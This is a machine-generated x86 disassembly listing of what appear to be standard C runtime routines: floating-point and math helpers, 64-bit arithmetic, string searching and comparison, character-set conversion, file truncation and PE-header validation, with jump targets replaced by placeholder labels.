cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax ax
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx eax ax
mov [ ebp - 0x8 ] eax
jmp r-xdata
sub_428d11
mov edi edi
push ebp
mov ebp esp
push esi
call sub_428724
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_428767
mov [ esi + 0x4 ] eax
xor eax eax
pop esi
pop ebp
retn
sub_428d2e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
push [ esi ]
call sub_42880f
push [ esi + 0x4 ]
call sub_42888f
lea eax [ ebp - 0x8 ]
push eax
call sub_428d11
mov eax [ esi ]
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
inc eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
xor eax eax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_428d77
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
push eax
call sub_428d11
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ecx ] edx
or edx 0x1f
push eax
mov [ ebp - 0x8 ] edx
call sub_428d2e
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
call sub_421fc0
xor eax eax
mov esp ebp
pop ebp
retn
sub_428dd0
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ esp + 0x4 ]
call sub_424a35
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_4293f8
sub_428e10
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_424a78
call sub_428e68
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_4293e0
sub_428e68
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
mov eax [ esp + 0xc ]
cmp [ esp ] 0x27f
je r-xdata
call sub_424a1c
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x7ff00000
je r-xdata
fldcw [ r--data ]
cmp [ rw-data ] 0x0
jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0xfffff
jne r-xdata
test eax 0x80000000
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
lea ecx [ r--data ]
mov edx 0x1b
call sub_4249a7
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ r--data ]
mov eax 0x1
jmp r-xdata
test eax 0x80000000
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fldlg2
fxch st1
fyl2x
pop edx
retn
fldcw [ esp ]
lea ecx [ r--data ]
mov edx 0x1b
jmp r-xdata
jmp r-xdata
fstp st0
fld [ r--data ]
mov eax 0x2
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_4249a7
pop edx
retn
sub_428f20
cmp [ rw-data ] 0x0
je r-xdata
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi 0xffff
push esi
push 0x1b3f
call sub_423916
fld [ ebp + 0x8 ]
mov ebx eax
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov eax 0x7ff0
and ecx eax
push ecx
push ecx
fstp [ esp ]
cmp cx ax
jne r-xdata
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
call sub_428c32
fst [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0x8
fucom st1
fnstsw ax
test ah 0x44
jpe r-xdata
call sub_42382f
dec eax
pop ecx
pop ecx
cmp eax 0x2
ja r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
test bl 0x20
jne r-xdata
push esi
fstp st1
push ebx
fstp st0
call sub_423916
fld [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
fld [ r--data ]
push ebx
sub esp 0x10
fadd st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x8
jmp r-xdata
push esi
push ebx
call sub_423916
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
push ebx
sub esp 0x10
fxch st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x10
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_423099
add esp 0x1c
movq xmm0 [ esp + 0x4 ]
movapd xmm2 [ r--data ]
movapd xmm1 xmm0
movapd xmm7 xmm0
psrlq xmm0 0x34
movd eax xmm0
andpd xmm0 [ r--data ]
psubd xmm2 xmm0
psrlq xmm1 xmm2
test eax 0x800
je r-xdata
movq xmm0 [ esp + 0x4 ]
psllq xmm1 xmm2
movapd xmm3 xmm0
cmppd xmm0 xmm1 0x6
cmp eax 0x3ff
jl r-xdata
cmp eax 0xbff
jl r-xdata
cmppd xmm3 [ r--data ] 0x6
andpd xmm3 [ r--data ]
movq [ esp + 0x4 ] xmm3
fld [ esp + 0x4 ]
retn
cmp eax 0x432
jg r-xdata
fld [ r--data ]
retn
psllq xmm1 xmm2
cmp eax 0xc32
jg r-xdata
ucomisd xmm7 xmm7
jpo r-xdata
andpd xmm0 [ r--data ]
addsd xmm1 xmm0
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
fld [ esp + 0x4 ]
retn
mov edx 0x3ec
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x14
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_42890f
add esp 0x10
sub_429073
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jle r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_41a56a
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push eax
push [ ebp + 0x18 ]
call sub_41a56a
pop ecx
pop ecx
sub esi eax
jne r-xdata
test eax eax
je r-xdata
xor eax eax
test esi esi
setns al
lea eax [ eax * 2 + 0x1 ]
push 0x2
pop eax
jmp r-xdata
xor ecx ecx
push ecx
push ecx
push ecx
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41be57
jmp r-xdata
pop esi
pop ebp
retn
sub_4290e0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_429141
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor eax eax
jmp r-xdata
push ebx
push edi
call sub_41be09
neg eax
sbb ebx ebx
xor edi edi
push edi
push edi
push 0xffffffff
push [ ebp + 0x8 ]
inc ebx
mov [ esi ] edi
push edi
push ebx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
add eax eax
push eax
call sub_419b3e
mov esi eax
pop ecx
test esi esi
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_415268
xor eax eax
jmp r-xdata
pop esi
push esi
call sub_41a3a5
mov eax edi
push [ ebp - 0x4 ]
push esi
push 0xffffffff
push [ ebp + 0x8 ]
push edi
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
pop ecx
pop edi
pop ebx
mov ecx [ ebp + 0xc ]
mov eax esi
mov esi edi
xor edi edi
inc edi
mov [ ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_415268
pop ecx
jmp r-xdata
sub_429208
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push 0x1
push esi
push esi
push edi
call sub_41da40
mov ecx eax
mov [ ebp - 0x10 ] eax
and ecx edx
mov [ ebp - 0xc ] edx
add esp 0x10
cmp ecx 0xffffffff
jne r-xdata
push 0x2
push esi
push esi
push edi
call sub_41da40
mov ecx eax
add esp 0x10
and ecx edx
cmp ecx 0xffffffff
je r-xdata
call sub_41529e
mov eax [ eax ]
jmp r-xdata
push ebx
mov ebx [ ebp + 0xc ]
sub ebx eax
mov eax [ ebp + 0x10 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp eax esi
jg r-xdata
jg r-xdata
push esi
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push edi
call sub_41da40
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
jl r-xdata
push 0x1
push 0x1000
call sub_41942e
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
cmp ebx esi
jbe r-xdata
xor eax eax
call sub_41529e
mov eax [ eax ]
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_41da40
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp ebx esi
jae r-xdata
push 0x8000
push edi
call sub_417e41
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_41529e
mov [ eax ] 0xc
jmp r-xdata
pop ebx
push edi
call sub_41fb96
pop ecx
push eax
call [ SetEndOfFile@IAT ]
test eax eax
jne r-xdata
mov eax ebx
jg r-xdata
call sub_41529e
push esi
mov edi [ eax ]
call sub_41a3a5
pop ecx
mov eax edi
jmp r-xdata
call sub_41529e
mov [ eax ] 0xd
call sub_41528b
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
jmp r-xdata
call sub_41528b
cmp [ eax ] 0x5
jne r-xdata
cdq
sub ebx eax
mov eax [ ebp - 0x4 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
test eax eax
jg r-xdata
mov eax 0x1000
jmp r-xdata
cmp ebx 0x1000
jb r-xdata
call sub_41529e
mov [ eax ] 0xd
jl r-xdata
push eax
push esi
push edi
call sub_41d112
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push edi
call sub_417e41
push esi
call sub_41a3a5
add esp 0xc
xor esi esi
test ebx ebx
jne r-xdata
test eax eax
jl r-xdata
sub_429399
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jle r-xdata
xor eax eax
push eax
push eax
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c293
pop esi
pop ebp
retn
push esi
push [ ebp + 0x10 ]
call sub_41a56a
pop ecx
cmp eax esi
pop ecx
lea esi [ eax + 0x1 ]
jl r-xdata
mov esi eax
sub_4293fe
mov edx 0x0
movlpd xmm0 [ esp + 0x4 ]
movapd xmm1 [ r--data ]
cmpsd xmm1 xmm0 0x0
pextrw eax xmm1 0x0
cmp eax 0x0
ja r-xdata
sub ecx 0x3fe
add ecx edx
cvtsi2sd xmm6 ecx
unpcklpd xmm6 xmm6
shl ecx 0xa
add eax ecx
mov ecx 0x10
mov edx 0x0
cmp eax 0x0
cmove edx ecx
movapd xmm1 [ r--data ]
movapd xmm3 xmm0
movapd xmm2 [ r--data ]
mulpd xmm1 xmm0
mulpd xmm3 xmm3
addpd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm3
movapd xmm5 [ r--data ]
mulpd xmm6 xmm5
movapd xmm5 [ edx + r--data ]
andpd xmm4 xmm5
addpd xmm7 xmm6
addpd xmm7 xmm4
mulpd xmm1 xmm0
mulsd xmm3 xmm0
addpd xmm1 xmm2
movapd xmm2 [ r--data ]
mulpd xmm2 xmm0
movapd xmm6 xmm7
unpckhpd xmm6 xmm6
mulpd xmm1 xmm3
sub esp 0x10
movapd xmm0 xmm1
addpd xmm1 xmm2
unpckhpd xmm0 xmm0
addsd xmm0 xmm1
addsd xmm0 xmm6
addsd xmm0 xmm7
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
movlpd xmm2 [ r--data ]
divsd xmm2 xmm0
movlpd xmm1 [ r--data ]
mov edx 0x8
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
sub esp 0x1c
movlpd [ esp + 0x10 ] xmm1
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x10
mov [ esp + 0x8 ] edx
add edx 0x10
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_42890f
fld [ esp + 0x10 ]
add esp 0x1c
retn
movlpd xmm1 [ r--data ]
mulsd xmm0 xmm1
mov edx 0xffffffcc
jmp r-xdata
cmp ecx 0x7fe
ja r-xdata
movapd xmm5 xmm0
unpcklpd xmm0 xmm0
psrlq xmm5 0x34
pextrw ecx xmm5 0x0
movapd xmm1 [ r--data ]
movapd xmm2 [ r--data ]
movapd xmm3 [ r--data ]
movapd xmm4 [ r--data ]
movapd xmm6 [ r--data ]
andpd xmm0 xmm1
orpd xmm0 xmm3
addpd xmm4 xmm0
pextrw eax xmm4 0x0
and eax 0x7f0
movapd xmm4 [ eax + r--data ]
movapd xmm7 [ eax + r--data ]
andpd xmm6 xmm0
subpd xmm0 xmm6
mulpd xmm6 xmm4
subpd xmm6 xmm2
addsd xmm7 xmm6
mulpd xmm0 xmm4
movapd xmm4 xmm0
addpd xmm0 xmm6
and ecx 0xfff
sub ecx 0x1
cmp ecx 0x7fd
ja r-xdata
add ecx 0x1
and ecx 0x7ff
cmp ecx 0x7ff
jae r-xdata
movlpd xmm0 [ esp + 0x4 ]
movapd xmm1 [ r--data ]
movapd xmm2 [ r--data ]
andpd xmm0 xmm1
orpd xmm0 xmm2
cmpsd xmm2 xmm0 0x0
pextrw eax xmm2 0x0
cmp eax 0x0
je r-xdata
movlpd xmm2 [ esp + 0x4 ]
movlpd xmm0 [ esp + 0x4 ]
movd eax xmm2
psrlq xmm2 0x20
movd ecx xmm2
and ecx 0xfffff
or eax ecx
cmp eax 0x0
je r-xdata
xorpd xmm1 xmm1
divsd xmm1 xmm1
mov edx 0x9
mov edx 0x3e9
jmp r-xdata
fld [ r--data ]
retn
mov edx 0x3e9
jmp r-xdata
sub_429751
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_429785
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_4297f0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_429830
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4298a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push ebx
push esi
push edi
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
add eax ecx
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4298f0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_410b00
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_4299b0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_4298a0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4299b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_4299f0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_429a90
push sub_410b00
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax

sub_429af0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_429b10
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_429b30
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_429c10
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax

cmp ecx eax
r-xdata
sub_429c40
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_429cf0
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_429db0
push ebp
mov ebp esp
push edi
cmp [ rw-data ] 0x1
jb r-xdata
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov edi [ ebp + 0x8 ]
ja r-xdata
mov eax edi
xor eax eax
jmp r-xdata
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
movzx edx [ ebp + 0xc ]
mov eax edx
shl edx 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov ecx 0xf
and ecx edi
or eax 0xffffffff
shl eax cl
sub edi ecx
xor edx edx
cld
pop edi
leave
retn
mov eax 0xfffffff0
and eax edi
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax ]
mov ecx 0xf
and ecx edi
mov edx 0xffffffff
shl edx cl
pmovmskb edi xmm0
and edi edx
jne r-xdata
xor eax eax
test edi 0xf
je r-xdata
push ebx
pmovmskb ebx xmm1
and ebx eax
shl ecx 0x1
xor eax eax
sub eax ecx
and ecx eax
dec ecx
and ecx ebx
pop ebx
bsr eax ecx
add eax edi
test ecx ecx
cmove eax edx
pop edi
leave
retn
pmovmskb ecx xmm1
and ecx eax
bsr eax ecx
add eax edi
test ecx ecx
cmovne edx eax
or eax 0xffffffff
add edi 0x10
jmp r-xdata
bsf edx edi
add eax edx
jmp r-xdata
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax + 0x10 ]
add eax 0x10
pmovmskb edi xmm0
test edi edi
je r-xdata
movd xmm0 edx
movzx ecx [ edi ]
cmp ecx edx
cmove eax edi
test ecx ecx
je r-xdata
movdqu xmm1 [ edi ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
pop edi
leave
retn
add edi 0x10
pcmpistri xmm0 [ edi - 0x10 ] 0x40
lea ecx [ edi + ecx - 0x10 ]
cmovb eax ecx
jne r-xdata
inc edi
test edi 0xf
jne r-xdata
sub_429ef0
cmp [ rw-data ] 0x1
jb r-xdata
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
movzx eax [ esp + 0x8 ]
mov edx eax
shl eax 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov edx [ esp + 0x4 ]
mov ecx 0xf
or eax 0xffffffff
and ecx edx
shl eax cl
sub edx ecx
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
bsf eax ecx
add eax edx
movd edx xmm3
xor ecx ecx
cmp dl [ eax ]
cmovne eax ecx
retn
